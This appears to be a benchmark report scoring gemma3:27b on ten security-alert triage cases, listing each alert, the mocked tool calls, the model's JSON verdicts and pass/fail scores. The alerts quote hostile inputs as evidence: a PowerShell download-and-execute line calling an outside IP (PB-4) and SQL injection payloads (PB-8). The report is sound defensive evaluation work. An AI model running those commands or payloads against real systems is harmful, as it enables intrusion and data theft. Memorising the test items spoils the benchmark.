# Playbook benchmark — `gemma3:27b`

Model: `gemma3:27b`  
Mode: **harness-executed**  
Run started: 2026-05-06 03:23:23  
Cases: 10  
Format failures: 0  

## Summary

| Metric | Score |
|---|---|
| Composite context-understanding score | **96%** |
| Verdict accuracy | 10/10 (100%) |
| Severity accuracy | 9/10 (90%) |
| MITRE accuracy | 9/10 (90%) |
| Tool-selection accuracy | 10/10 (100%) |
| Format failures | 0/10 |
| Forbidden tool calls (e.g. auto-isolate on benign) | 0 |
| Not-found tool responses (hallucinated entities) | 2 |
| p50 latency | 9.3 s |
| p95 latency | 11.0 s |

## Per-case results

| Case | Expected | Verdict | Severity | MITRE | Tools | Latency |
|---|---|---|---|---|---|---|
| PB-1 | beni | PASS | PASS | PASS | PASS | 15.2s |
| PB-2 | inci | PASS | PASS | PASS | PASS | 10.6s |
| PB-3 | inci | PASS | PASS | PASS | PASS | 11.0s |
| PB-4 | inci | PASS | PASS | PASS | PASS | 9.2s |
| PB-5 | inci | PASS | PASS | PASS | PASS | 8.8s |
| PB-6 | inci | PASS | PASS | FAIL | PASS | 9.3s |
| PB-7 | beni | PASS | PASS | PASS | PASS | 7.6s |
| PB-8 | inci | PASS | PASS | PASS | PASS | 10.2s |
| PB-9 | inci | PASS | PASS | PASS | PASS | 8.6s |
| PB-10 | inci | PASS | FAIL | PASS | PASS | 9.3s |

## Per-case detail

### PB-1 — expected: **benign** (severity ['info', 'low'], MITRE n/a)

_Alert_: Single-event alert: user `alice` (laptop 10.0.4.22) authenticated to the corporate intranet at 09:02 local time on a workday and opened her email. No prior failed attempts. Source matches her usual IP range.

_Latency_: 15.22s · GPU 100%/20534MB · CPU 21% · RAM 34227MB

_Tool calls_:
```
- cmdb.get_asset({"host_or_ip": "10.0.4.22"}) -> {"query": "10.0.4.22", "found": true, "hostname": "alice-laptop", "criticality": "low", "owner": "alice", "business_unit": "marketing", "os": "macOS 14", "tags"
- threat_intel.lookup_ip({"ip": "10.0.4.22"}) -> {"ip": "10.0.4.22", "verdict": "benign", "score": 5, "geo": "internal", "tags": ["rfc1918"], "first_seen": null, "notes": "Internal corporate range"}
```

_Parsed answer_:
```json
{
  "verdict": "benign",
  "severity": "info",
  "mitre": [],
  "tools_used": [
    "cmdb.get_asset",
    "threat_intel.lookup_ip"
  ],
  "rationale": "The internal IP 10.0.4.22 is within a known corporate range (benign verdict, score 5) and the asset is a standard endpoint with low criticality. No anomalous behavior detected."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset'])

### PB-2 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1078', 'T1078.002', 'T1021', 'T1021.001'])

_Alert_: Domain admin account `dom_admin_01` authenticated successfully from external IP 41.78.122.18 at 03:14 UTC. Within 4 minutes the same account opened 18 RDP sessions to internal hosts (DC01, FILER-02, FINANCE-DB, ENG-FILE, BACKUP-01, …).

_Latency_: 10.58s · GPU 94%/20534MB · CPU 20% · RAM 34333MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "41.78.122.18"}) -> {"ip": "41.78.122.18", "verdict": "malicious", "score": 92, "geo": "NG", "tags": ["c2", "rdp-bruteforce"], "first_seen": "2026-04-22", "notes": "Recent C2 sight
- cmdb.get_asset({"host_or_ip": "DC01"}) -> {"query": "DC01", "found": true, "hostname": "dc01", "criticality": "critical", "owner": "infra-team", "business_unit": "platform", "os": "Windows Server 2022",
- cmdb.get_asset({"host_or_ip": "FILER-02"}) -> {"query": "FILER-02", "found": false, "notes": "Not in CMDB \u2014 likely external or unmanaged asset."}
- cmdb.get_asset({"host_or_ip": "FINANCE-DB"}) -> {"query": "FINANCE-DB", "found": false, "notes": "Not in CMDB \u2014 likely external or unmanaged asset."}
- siem.query_logs({"query": "dom_admin_01", "hours": 24}) -> {"query": "dom_admin_01", "hours": 24, "matched": 0, "events": [], "summary": "No matching events in the requested window."}
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "critical",
  "mitre": [
    "T1078.002",
    "T1190",
    "T1021.002"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "External IP 41.78.122.18 is flagged as malicious with a score of 92 and tags 'c2' and 'rdp-bruteforce'. The target DC01 is a Tier-0 asset. The lack of prior SIEM events for dom_admin_01 suggests this is not routine behavior."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['threat_intel.lookup_ip', 'siem.query_logs']) not_found_calls=2

### PB-3 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1110.003', 'T1110.004'])

_Alert_: Web server `webhost` (10.0.4.10): 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, including 3 successful logins to admin accounts. Sample source IP: 89.248.165.74.

_Latency_: 11.03s · GPU 92%/20534MB · CPU 18% · RAM 34295MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "89.248.165.74"}) -> {"ip": "89.248.165.74", "verdict": "malicious", "score": 88, "geo": "NL", "tags": ["botnet", "wp-bruteforce"], "first_seen": "2026-03-11", "notes": "Known WordP
- cmdb.get_asset({"host_or_ip": "10.0.4.10"}) -> {"query": "10.0.4.10", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "t
- cmdb.get_asset({"host_or_ip": "webhost"}) -> {"query": "webhost", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "tag
- siem.query_logs({"query": "10.0.4.10", "hours": "1"}) -> {"query": "10.0.4.10", "hours": 1, "matched": 0, "events": [], "summary": "No matching events in the requested window."}
- siem.query_logs({"query": "wp-login.php", "hours": "1"}) -> {"query": "wp-login.php", "hours": 1, "matched": 50312, "events": [{"ts": "2026-05-06T14:01:02Z", "src_ip": "89.248.165.74", "method": "POST", "path": "/wp-logi
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1110.003",
    "T1078.002"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "Threat intel identifies 89.248.165.74 as a WordPress credential-stuffing botnet node (score 88, tag 'wp-bruteforce'). The target webhost is a high-criticality public-facing WordPress server. SIEM confirms a large-scale credential stuffing attack with three successful logins to admin accounts."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['threat_intel.lookup_ip', 'siem.query_logs'])

### PB-4 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1059.001', 'T1059', 'T1566.001', 'T1204', 'T1204.002'])

_Alert_: EDR alert on host WIN-DEV-04: `winword.exe` spawned `powershell.exe` which executed `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.15/a.ps1')`. User: dave.

_Latency_: 9.23s · GPU 93%/20534MB · CPU 26% · RAM 34270MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "185.220.101.15"}) -> {"ip": "185.220.101.15", "verdict": "malicious", "score": 95, "geo": "DE", "tags": ["tor-exit", "malware-c2"], "first_seen": "2025-11-29", "notes": "Tor exit no
- cmdb.get_asset({"host_or_ip": "WIN-DEV-04"}) -> {"query": "WIN-DEV-04", "found": true, "hostname": "WIN-DEV-04", "criticality": "medium", "owner": "dave", "business_unit": "engineering", "os": "Windows 11", "
- edr.get_processes({"host": "WIN-DEV-04"}) -> {"host": "WIN-DEV-04", "found": true, "processes": [{"pid": 4112, "name": "winword.exe", "parent": "explorer.exe", "cmdline": "WINWORD.EXE /n \"C:\\Users\\dave\
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1204.002",
    "T1105",
    "T1566.001"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "edr.get_processes"
  ],
  "rationale": "The external IP 185.220.101.15 is flagged as malicious with a score of 95 and associated with Cobalt Strike. The EDR process tree shows winword.exe spawning powershell.exe to download and execute a script from the malicious IP, followed by rundll32.exe loading a DLL from ProgramData \u2013 a classic post-exploitation pattern."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['edr.get_processes', 'threat_intel.lookup_ip'])

### PB-5 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1071.004', 'T1071', 'T1048.003', 'T1048'])

_Alert_: DNS server logs show internal host 10.0.4.55 issuing 4,000+ unique subdomain queries against `cdn-update.xyz` over 2 hours, with TXT-record responses averaging 200 bytes.

_Latency_: 8.80s · GPU 93%/20534MB · CPU 16% · RAM 34334MB

_Tool calls_:
```
- threat_intel.lookup_domain({"domain": "cdn-update.xyz"}) -> {"domain": "cdn-update.xyz", "verdict": "malicious", "score": 90, "registered": "2026-04-22", "tags": ["dga-like", "dns-tunnel"], "notes": "Registered 14 days a
- cmdb.get_asset({"host_or_ip": "10.0.4.55"}) -> {"query": "10.0.4.55", "found": true, "hostname": "ops-jumphost", "criticality": "high", "owner": "secops", "business_unit": "platform", "os": "Ubuntu 22.04", "
- siem.query_logs({"query": "10.0.4.55", "hours": 24}) -> {"query": "10.0.4.55", "hours": 24, "matched": 0, "events": [], "summary": "No matching events in the requested window."}
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "critical",
  "mitre": [
    "T1572",
    "T1071"
  ],
  "tools_used": [
    "threat_intel.lookup_domain",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "The domain cdn-update.xyz has a malicious verdict (score 90) and is tagged as DGA-like/DNS-tunnel; the internal host 10.0.4.55 (ops-jumphost) has high criticality and a 'no-egress-allowed' tag; the SIEM shows no prior related events, indicating this is a new behavior."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['threat_intel.lookup_domain', 'cmdb.get_asset'])

### PB-6 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1078'])

_Alert_: sshd on host `webhost` (10.0.4.10) recorded 7 failed password attempts for distinct usernames (admin, root, oracle, postgres, git, test, ubuntu) from source IP 185.220.101.45 between 03:41:02 and 03:41:20, followed by a successful login as `ubuntu` from the same IP at 03:43:21.

_Latency_: 9.34s · GPU 93%/20534MB · CPU 16% · RAM 34323MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "185.220.101.45"}) -> {"ip": "185.220.101.45", "verdict": "malicious", "score": 95, "geo": "DE", "tags": ["tor-exit", "ssh-bruteforce"], "first_seen": "2025-12-04", "notes": "Tor exi
- cmdb.get_asset({"host_or_ip": "10.0.4.10"}) -> {"query": "10.0.4.10", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "t
- siem.query_logs({"query": "185.220.101.45", "hours": 24}) -> {"query": "185.220.101.45", "hours": 24, "matched": 9, "events": [{"ts": "2026-05-06T03:41:02Z", "host": "webhost", "subject": "sshd", "msg": "Failed password f
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1110.003",
    "T1059"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "The source IP 185.220.101.45 is flagged as malicious with a score of 95 and tags 'tor-exit' and 'ssh-bruteforce'. The target webhost is a high-criticality, public-facing asset. The SIEM confirms a pattern of SSH bruteforcing followed by successful login."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=PASS (matched: ['threat_intel.lookup_ip', 'cmdb.get_asset'])

### PB-7 — expected: **benign** (severity ['info', 'low'], MITRE n/a)

_Alert_: Routine sshd event on `webhost` (10.0.4.10): publickey login accepted for `alice` from 10.0.4.22 at 09:14:32. PAM session opened. systemd-logind started session 2841.

_Latency_: 7.63s · GPU 93%/20534MB · CPU 20% · RAM 34366MB

_Tool calls_:
```
- cmdb.get_asset({"host_or_ip": "10.0.4.10"}) -> {"query": "10.0.4.10", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "t
- cmdb.get_asset({"host_or_ip": "10.0.4.22"}) -> {"query": "10.0.4.22", "found": true, "hostname": "alice-laptop", "criticality": "low", "owner": "alice", "business_unit": "marketing", "os": "macOS 14", "tags"
- threat_intel.lookup_ip({"ip": "10.0.4.22"}) -> {"ip": "10.0.4.22", "verdict": "benign", "score": 5, "geo": "internal", "tags": ["rfc1918"], "first_seen": null, "notes": "Internal corporate range"}
```

_Parsed answer_:
```json
{
  "verdict": "benign",
  "severity": "info",
  "mitre": [],
  "tools_used": [
    "cmdb.get_asset",
    "threat_intel.lookup_ip"
  ],
  "rationale": "The source IP 10.0.4.22 is internal and benign according to threat intel. The target webhost is public-facing but the login appears to be a routine SSH connection from a known internal endpoint (alice-laptop)."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset'])

### PB-8 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1190'])

_Alert_: Apache access log on `webhost` (10.0.4.10) shows 4 requests from 185.62.190.13 within 4 seconds: `GET /products.php?id=1' OR '1'='1--`, `GET /products.php?id=1+UNION+SELECT+username,password+FROM+users--`, `GET /products.php?id=1;DROP+TABLE+users--`, `GET /products.php?id=1+AND+SLEEP(5)--`. The UNION SELECT request returned a 200 with a 4129-byte body.

_Latency_: 10.22s · GPU 94%/20534MB · CPU 13% · RAM 34365MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "185.62.190.13"}) -> {"ip": "185.62.190.13", "verdict": "suspicious", "score": 78, "geo": "GB", "tags": ["sqlmap", "scanner"], "first_seen": "2026-04-30", "notes": "Recent sqlmap us
- cmdb.get_asset({"host_or_ip": "10.0.4.10"}) -> {"query": "10.0.4.10", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "t
- siem.query_logs({"query": "185.62.190.13", "hours": "24"}) -> {"query": "185.62.190.13", "hours": 24, "matched": 4, "events": [{"ts": "2026-05-06T14:22:03Z", "src_ip": "185.62.190.13", "method": "GET", "path": "/products.p
- openvas.scan_host({"ip_or_host": "10.0.4.10"}) -> {"target": "10.0.4.10", "queued": true, "scan_id": "SCAN-1001", "notes": "Scan completed (mock returns immediately)."}
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1190",
    "T1078",
    "T1619"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs",
    "openvas.scan_host"
  ],
  "rationale": "IP 185.62.190.13 is flagged as suspicious with sqlmap tags (score 78); the target webhost is a high-criticality public-facing WordPress server; the SIEM confirms SQL injection attempts, including a UNION SELECT that returned a 4KB response, indicating potential data exfiltration."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['threat_intel.lookup_ip', 'openvas.scan_host'])

### PB-9 — expected: **incident** (severity ['medium', 'high'], MITRE ['T1098', 'T1548', 'T1136', 'T1078'])

_Alert_: On host `webhost` at 03:17:42, user `bob` (TTY pts/3) ran `sudo /usr/sbin/usermod -aG sudo svc_backup`. The change was applied (`add 'svc_backup' to group 'sudo'`). bob is a developer account with sudo rights but no documented need to modify service-account permissions at 03:17.

_Latency_: 8.57s · GPU 100%/20534MB · CPU 20% · RAM 34384MB

_Tool calls_:
```
- cmdb.get_asset({"host_or_ip": "webhost"}) -> {"query": "webhost", "found": true, "hostname": "webhost", "criticality": "high", "owner": "infra-team", "business_unit": "platform", "os": "Ubuntu 22.04", "tag
- siem.query_logs({"query": "bob", "hours": 24}) -> {"query": "bob", "hours": 24, "matched": 0, "events": [], "summary": "No matching events in the requested window."}
- edr.get_processes({"host": "webhost"}) -> {"host": "webhost", "found": true, "processes": [{"pid": 18290, "name": "bash", "parent": "sshd", "cmdline": "-bash"}, {"pid": 18293, "name": "usermod", "parent
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1548.002",
    "T1078",
    "T1133"
  ],
  "tools_used": [
    "cmdb.get_asset",
    "siem.query_logs",
    "edr.get_processes"
  ],
  "rationale": "The target 'webhost' is a public-facing, high-criticality asset. EDR shows bob ran 'usermod' to add a service account to the sudo group, followed by a curl to a remote server and subsequent bash execution. The lack of prior log activity for 'bob' in the SIEM and the suspicious process chain (curl->bash) strongly indicate malicious intent."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset', 'edr.get_processes'])

### PB-10 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1110.003', 'T1078', 'T1078.002'])

_Alert_: Domain controller DC01: 5 sequential EventID 4625 (BadPassword) events for account `Administrator`, LogonType 3, source IP 192.168.50.13 (workstation KIOSK-04) between 02:18:14 and 02:18:24, followed by an EventID 4624 (success) for the same account from the same IP at 02:21:42.

_Latency_: 9.32s · GPU 95%/20534MB · CPU 47% · RAM 34369MB

_Tool calls_:
```
- threat_intel.lookup_ip({"ip": "192.168.50.13"}) -> {"ip": "192.168.50.13", "verdict": "benign", "score": 10, "geo": "internal", "tags": ["rfc1918", "kiosk-subnet"], "first_seen": null, "notes": "Internal kiosk s
- cmdb.get_asset({"host_or_ip": "DC01"}) -> {"query": "DC01", "found": true, "hostname": "dc01", "criticality": "critical", "owner": "infra-team", "business_unit": "platform", "os": "Windows Server 2022",
- cmdb.get_asset({"host_or_ip": "KIOSK-04"}) -> {"query": "KIOSK-04", "found": true, "hostname": "KIOSK-04", "criticality": "low", "owner": "facilities", "business_unit": "office", "os": "Windows 10", "tags":
- siem.query_logs({"query": "Administrator", "hours": 24}) -> {"query": "Administrator", "hours": 24, "matched": 0, "events": [], "summary": "No matching events in the requested window."}
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "medium",
  "mitre": [
    "T1110.003",
    "T1078.002"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "Multiple bad password attempts followed by a successful login for the Administrator account from a kiosk (KIOSK-04) is suspicious. The kiosk is tagged with 'no-admin-auth-expected', raising the severity. SIEM query shows no prior similar activity."
}
```

_Scoring_: verdict=PASS severity=FAIL mitre=PASS tools=PASS (matched: ['cmdb.get_asset', 'siem.query_logs'])
